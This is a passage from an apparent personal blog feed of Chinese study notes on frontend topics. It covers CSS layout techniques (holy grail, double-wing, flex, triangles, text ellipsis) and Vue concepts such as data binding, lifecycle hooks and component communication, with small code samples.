class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">        *&#123;</span><br><span class="line">            padding: 0;</span><br><span class="line">            margin: 0;</span><br><span class="line">        &#125;</span><br><span class="line">        body&#123;</span><br><span class="line">            min-width: 600px;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-class">.clearfix</span><span class="selector-pseudo">::before</span>,<span class="selector-class">.clearfix</span><span class="selector-pseudo">::after</span>&#123;</span></span><br><span class="line">            display: table;</span><br><span class="line">            content: '';</span><br><span class="line">            clear: both;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-class">.header</span>,<span class="selector-class">.footer</span>&#123;</span></span><br><span class="line">            width: 100%;</span><br><span class="line">            height: 10vh;</span><br><span class="line"><span class="css">            <span class="selector-tag">background-color</span>: <span class="selector-id">#7ecef3</span></span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-class">.container</span>&#123;</span></span><br><span class="line">            padding: 0 200px;</span><br><span class="line">            height: 80vh;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-class">.main</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">background-color</span>: <span class="selector-id">#53b9be</span>;</span></span><br><span class="line">            width: 100%;</span><br><span class="line">            height: 100%;</span><br><span class="line">            float: left; </span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-class">.left</span>,<span class="selector-class">.right</span>&#123;</span></span><br><span class="line">            float: left;</span><br><span class="line"><span class="css">            <span class="selector-tag">background-color</span>: <span class="selector-id">#89c997</span>;</span></span><br><span class="line">            width: 200px;</span><br><span class="line">            height: 100%;</span><br><span class="line">            position: relative;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-class">.left</span>&#123;</span></span><br><span class="line">            margin-left: -100%;</span><br><span class="line">            left: -200px;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-class">.right</span>&#123;</span></span><br><span class="line">            margin-left: -200px;</span><br><span class="line">            left: 200px;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"header"</span>&gt;</span>Header<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container clearfix"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"main"</span>&gt;</span>Content<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"left"</span>&gt;</span>Left<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"right"</span>&gt;</span>Right<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"footer"</span>&gt;</span>Footer<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="双飞翼布局"><a href="#双飞翼布局" class="headerlink" title="双飞翼布局"></a>双飞翼布局</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">        *&#123;</span><br><span class="line">            padding: 0;</span><br><span class="line">            margin: 0;</span><br><span class="line">        &#125;</span><br><span class="line">        body&#123;</span><br><span class="line">            min-width: 600px;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-class">.clearfix</span><span class="selector-pseudo">::before</span>,</span></span><br><span class="line"><span class="css">        <span class="selector-class">.clearfix</span><span class="selector-pseudo">::after</span>&#123;</span></span><br><span class="line">            display: table;</span><br><span class="line">            content: '';</span><br><span class="line">            clear: both;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-class">.header</span>,</span></span><br><span class="line"><span class="css">        <span class="selector-class">.footer</span>&#123;</span></span><br><span class="line">            width: 100%;</span><br><span class="line">            height: 10vh;</span><br><span class="line"><span class="css">            <span class="selector-tag">background-color</span>: <span class="selector-id">#7ecef3</span></span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-class">.container</span>&#123;           </span></span><br><span class="line">            float: left;</span><br><span class="line">            width: 100%;</span><br><span class="line">            height: 80vh;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-class">.main</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">background-color</span>: <span class="selector-id">#53b9be</span>;</span></span><br><span class="line">            height: 100%;</span><br><span class="line">            margin: 0 200px;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-class">.left</span>,</span></span><br><span class="line"><span class="css">        <span class="selector-class">.right</span>&#123;</span></span><br><span class="line">            float: left;</span><br><span class="line">            width: 200px;</span><br><span class="line">            height: 80vh;</span><br><span class="line"><span class="css">            <span class="selector-tag">background-color</span>: <span class="selector-id">#89c997</span>;</span></span><br><span class="line">            position: relative;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-class">.left</span>&#123;</span></span><br><span class="line">            margin-left: -100%;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-class">.right</span>&#123;</span></span><br><span class="line">            margin-left: -200px;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"header"</span>&gt;</span>Header<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box clearfix"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"main"</span>&gt;</span>Content<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"left"</span>&gt;</span>Left<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"right"</span>&gt;</span>Right<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"footer"</span>&gt;</span>Footer<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="flex实现"><a href="#flex实现" class="headerlink" title="flex实现"></a>flex实现</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">        *&#123;</span><br><span class="line">            padding: 0;</span><br><span class="line">            margin: 0;</span><br><span class="line">        &#125;</span><br><span class="line">        body&#123;</span><br><span class="line">            min-width: 600px;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-class">.clearfix</span><span class="selector-pseudo">::before</span>,</span></span><br><span class="line"><span class="css">        <span class="selector-class">.clearfix</span><span class="selector-pseudo">::after</span>&#123;</span></span><br><span class="line">            display: table;</span><br><span class="line">            content: '';</span><br><span class="line">            clear: both;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-class">.header</span>,</span></span><br><span class="line"><span class="css">        <span class="selector-class">.footer</span>&#123;</span></span><br><span class="line">            width: 100%;</span><br><span class="line">            height: 10vh;</span><br><span class="line"><span class="css">            <span class="selector-tag">background-color</span>: <span class="selector-id">#7ecef3</span></span></span><br><span class="line">        &#125;    </span><br><span class="line"><span class="css">        <span class="selector-class">.container</span>&#123;</span></span><br><span class="line">            display: flex;</span><br><span class="line">            width: 100%;</span><br><span class="line">            height: 80vh;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-class">.main</span>&#123;</span></span><br><span class="line">            flex: 1;</span><br><span class="line"><span class="css">            <span class="selector-tag">background-color</span>: <span class="selector-id">#53b9be</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-class">.left</span>,</span></span><br><span class="line"><span class="css">        <span class="selector-class">.right</span>&#123;</span></span><br><span class="line">            flex: 0 0 200px;</span><br><span class="line"><span class="css">            <span class="selector-tag">background-color</span>: <span class="selector-id">#89c997</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-class">.left</span>&#123;</span></span><br><span class="line">            order: -1;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"header"</span>&gt;</span>Header<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"main"</span>&gt;</span>Content<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"left"</span>&gt;</span>Left<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"right"</span>&gt;</span>Right<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"footer"</span>&gt;</span>Footer<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="如何画0-5px的线"><a href="#如何画0-5px的线" class="headerlink" title="如何画0.5px的线"></a>如何画0.5px的线</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.line</span>&#123;</span><br><span class="line">    <span class="attribute">position</span>:relative</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.line</span><span class="selector-pseudo">:after</span>&#123;</span><br><span class="line">    <span class="attribute">content</span>:<span class="string">""</span>;</span><br><span class="line">    <span class="attribute">positon</span>:absolute;</span><br><span class="line">    <span class="attribute">height</span>:<span class="number">1px</span>;</span><br><span class="line">    <span class="attribute">left</span>:<span class="number">0</span>;</span><br><span class="line">    <span class="attribute">top</span>:<span class="number">0</span>;</span><br><span class="line">    <span class="attribute">width</span>:<span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">transform</span>:<span class="built_in">scaleY</span>(0.5)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="PC端如何让文字实现小于12px"><a href="#PC端如何让文字实现小于12px" class="headerlink" title="PC端如何让文字实现小于12px"></a>PC端如何让文字实现小于12px</h2><p>使用transform:scale进行宽高缩放，如果是行内元素首先使用display：inline-block</p><h2 id="右箭头"><a href="#右箭头" class="headerlink" title="右箭头"></a>右箭头</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.ft</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>:<span class="number">7px</span>;</span><br><span class="line">    <span class="attribute">height</span>:<span class="number">7px</span>;</span><br><span class="line">    <span class="attribute">border-top</span>:<span class="number">2px</span> solid <span class="number">#ccc</span>;</span><br><span class="line">    <span class="attribute">border-right</span>:<span class="number">2px</span> solid <span class="number">#ccc</span>;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">rotate</span>(45deg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="三角形"><a href="#三角形" class="headerlink" title="三角形"></a>三角形</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.triangle</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">50px</span> solid transparent;</span><br><span class="line">    <span class="attribute">border-top</span>: <span class="number">50px</span> solid red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="单行多行文本省略号隐藏"><a href="#单行多行文本省略号隐藏" class="headerlink" title="单行多行文本省略号隐藏"></a>单行多行文本省略号隐藏</h2><h3 id="单行"><a href="#单行" class="headerlink" title="单行"></a>单行</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.text</span>&#123;</span><br><span class="line">    <span class="attribute">overflow</span>:hidden;</span><br><span class="line">    <span class="attribute">white-space</span>:nowrap;</span><br><span class="line">    <span class="attribute">text-overflow</span>:ellipsis;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="多行"><a href="#多行" class="headerlink" title="多行"></a>多行</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.text</span>&#123;</span><br><span class="line">    <span class="attribute">display</span>: -webkit-box;</span><br><span class="line">    <span class="attribute">-webkit-box-orient</span>: vertical;</span><br><span class="line">    <span class="attribute">-webkit-line-clamp</span>: <span class="number">3</span>;</span><br><span class="line">    <span class="attribute">overflow</span>: hidden;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;这篇文章会记录我的一些css知识点笔记，方便自己进行复习，长期施工…&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="面试题" scheme="https://gzzzzh.github.io/tags/%E9%9D%A2%E8%AF%95%E9%A2%98/"/>
    
      <category term="CSS" scheme="https://gzzzzh.github.io/tags/CSS/"/>
    
  </entry>
  
  <entry>
    <title>vue知识点</title>
    <link href="https://gzzzzh.github.io/2019/09/06/vue%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
    <id>https://gzzzzh.github.io/2019/09/06/vue知识点/</id>
    <published>2019-09-06T07:07:17.000Z</published>
    <updated>2019-09-06T10:25:50.075Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这篇文章会记录我的一些Vue知识点笔记，方便自己进行复习，长期施工…<br><a id="more"></a></p><h2 id="双向数据绑定原理"><a href="#双向数据绑定原理" class="headerlink" title="双向数据绑定原理"></a>双向数据绑定原理</h2><p>vue采用数据劫持结合发布者-订阅者模式的方式，通过Object.defineProperty()来劫持各个属性的getter，setter，在数据变动时触发set函数通知发布中心发布信息给订阅者，触发相应的监听回调(更新视图)</p><p>此时我们需要一个监听器Observer来监听属性的变化，得知属性发生变化后需要一个Watcher订阅者来更新视图，我们还需要一个compile指令解析器，用于解析我们的节点元素指令和初始化视图</p><ul><li>Observer监听器：用来监听属性的变化通知订阅者，Object.defineProperty()就是在这个地方进行数据劫持</li><li>Watcher订阅者(可以理解为一个dom)：收到属性的变化，然后去更新视图，原理是某个属性改变后执行订阅了这个属性的订阅者的更新方法，更新方法为订阅者进行dom操作修改这个属性的新值，从而更新视图</li><li>Compile解析器 ：解析指令，初始化模板，订阅数据变化（定义在view层能够监听到数据变化的事件），绑定更新函数（给订阅者绑定某个属性更新的方法，让他能在收到此属性改变的通知时对这个属性进行视图更新）</li></ul><p><img src="https://blog-1257601889.cos.ap-shanghai.myqcloud.com/vue/vue-mvvm-jiagou.png" alt></p><h2 id="MVVM的理解"><a href="#MVVM的理解" class="headerlink" title="MVVM的理解"></a>MVVM的理解</h2><h3 id="MVVM是Model-View-ViewModel缩写"><a href="#MVVM是Model-View-ViewModel缩写" class="headerlink" title="MVVM是Model-View-ViewModel缩写"></a>MVVM是Model-View-ViewModel缩写</h3><ul><li>Model代表数据模型，也可以在Model中定义数据修改和操作的业务逻辑</li><li>View代表UI组件，他负责将数据模型转化为UI展示出来</li><li>ViewModel监听模型数据的改变和控制视图行为，处理用户交互，简单来说就是一个同步view和model的对象，连接他们</li></ul><p>在MVVM架构下，View和Model之间没有直接联系，而是通过ViewModel进行交互，ViewModel将两者通过双向数据绑定连接起来，View的数据变化会马上同步到Model中，而Model数据变化也会反映到View上</p><h2 id="Vue生命周期"><a href="#Vue生命周期" class="headerlink" title="Vue生命周期"></a>Vue生命周期</h2><p>在Vue实例开始创建，初始化数据，编译模板，挂载Dom→渲染，更新→渲染，卸载等一系列过程，称为生命周期，简单来说就是Vue实例从创建到销毁的过程</p><h3 id="beforeCreate"><a href="#beforeCreate" class="headerlink" title="beforeCreate"></a>beforeCreate</h3><p>Vue实例刚刚创建出来，data，methods，watch，computed都不能访问</p><h3 id="created"><a href="#created" class="headerlink" title="created"></a>created</h3><p>此时data等可以访问，可以在此时进行一部分请求，不宜太多，因为会导致白屏时间过长，$el不能访问，$refs是一个空数组，需要操作dom的话要使用nextTick</p><h3 id="beforeMount"><a href="#beforeMount" class="headerlink" title="beforeMount"></a>beforeMount</h3><p>模板在内存中已经编译好，但是还没渲染到页面上，此时访问html里面的元素可以发现模板字符串还没替换过来</p><h3 id="mounted"><a href="#mounted" class="headerlink" title="mounted"></a>mounted</h3><p>完成挂载dom和双向数据绑定，可以对dom进行操作，访问$ref。代表内存中模板已经挂载到页面中，可以看到渲染好的页面</p><h3 id="beforeUpdate"><a href="#beforeUpdate" class="headerlink" title="beforeUpdate"></a>beforeUpdate</h3><p>此时data数据更新了，页面的数据还没进行更新</p><h3 id="updated"><a href="#updated" class="headerlink" title="updated"></a>updated</h3><p>更新已经完毕，不能在此时修改数据，会陷入死循环</p><h3 id="beforeDestroy"><a href="#beforeDestroy" class="headerlink" title="beforeDestroy"></a>beforeDestroy</h3><p>实例销毁之前，data等还可以进行访问，可以进行提示操作</p><h3 id="destroyed"><a href="#destroyed" class="headerlink" title="destroyed"></a>destroyed</h3><p>当前实例已经被删除，data等无法使用</p><h3 id="activated"><a href="#activated" class="headerlink" title="activated"></a>activated</h3><p>在使用vue-router的时候会使用到keepalive缓存组件，此时组件的created等生命周期函数无法触发，进入缓存组件时触发此函数</p><h3 id="deactivated"><a href="#deactivated" class="headerlink" title="deactivated"></a>deactivated</h3><p>当在keepalive组件离开时就会触发。以上这两个周期函数只有在使用到了keepalive才会有，触发顺序为Created→Mounted→activated</p><h2 id="Vue组件通信方法"><a href="#Vue组件通信方法" class="headerlink" title="Vue组件通信方法"></a>Vue组件通信方法</h2><h3 id="props和-emit-父子"><a href="#props和-emit-父子" class="headerlink" title="props和$emit(父子)"></a>props和$emit(父子)</h3><p>父组件向子组件传递数据时通过prop传递的，子组件传递数据给父组件是通过$emit触发事件来做到的</p><h3 id="attrs和-listeners-父子"><a href="#attrs和-listeners-父子" class="headerlink" title="$attrs和$listeners(父子)"></a>$attrs和$listeners(父子)</h3><p>当存在 组件A→组件B组件C 这时候A想传递给C用第一种方法会传递必须分步进行，此时在Vue2.4提供了新方法</p><p>A往B传递数据和方法，在B中通过prop获取属于自己的，剩下不属于B的数据和方法 在B中通过v-bind=”$attrs”和v-on=”$listeners”传递下去给C</p><h3 id="EventBus-中央事件总线-（任意）"><a href="#EventBus-中央事件总线-（任意）" class="headerlink" title="EventBus(中央事件总线)（任意）"></a>EventBus(中央事件总线)（任意）</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建一个Vue实例</span></span><br><span class="line"><span class="keyword">const</span> bus = <span class="keyword">new</span> Vue()</span><br><span class="line"></span><br><span class="line"><span class="comment">//触发事件</span></span><br><span class="line">bus.$emit(<span class="string">'xxx'</span>,val)</span><br><span class="line"></span><br><span class="line"><span class="comment">//监听事件</span></span><br><span class="line">bus.$on(<span class="string">'xxx'</span>,val=&gt; <span class="built_in">console</span>.log(val)</span><br></pre></td></tr></table></figure><h3 id="provide和inject（父子）"><a href="#provide和inject（父子）" class="headerlink" title="provide和inject（父子）"></a>provide和inject（父子）</h3><p>这个用法主要是为高阶插件和组件库提供用例，并不推荐直接用于应用程序代码中</p><p>父组件中通过provider对象中的数据来提供变量，然后在子组件中通过inject来注入变量。不论子组件有多深，只要调用了injectname就可以注入provider中的数据，只要在父组件的生命周期内，子组件都可以调用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">provider:&#123;</span><br><span class="line">    <span class="keyword">for</span>:<span class="number">123</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">inject:[<span class="string">'for'</span>]</span><br></pre></td></tr></table></figure><h3 id="v-model（父子）"><a href="#v-model（父子）" class="headerlink" title="v-model（父子）"></a>v-model（父子）</h3><p>父组件通过v-model传递值给子组件时，会自动传递一个value的prop属性，在子组件中通过this.$emit(‘input’,val)可以自动修改v-model的值</p><h3 id="parent和-children"><a href="#parent和-children" class="headerlink" title="$parent和$children"></a>$parent和$children</h3><p>可以获取父组件实例和子组件实例<br>this.$children是个数组</p><h3 id="vuex"><a href="#vuex" class="headerlink" title="vuex"></a>vuex</h3><p>单独详解</p><h2 id="初始化data"><a href="#初始化data" class="headerlink" title="初始化data"></a>初始化data</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Object</span>.assign(<span class="keyword">this</span>.data,<span class="keyword">this</span>.$options.data())</span><br></pre></td></tr></table></figure><p>this.data是表示当前的改变后的this中的数据，而this.$options.data()是表示没有赋值前的this中的数据</p>]]></content>
    
    <summary type="html">
    
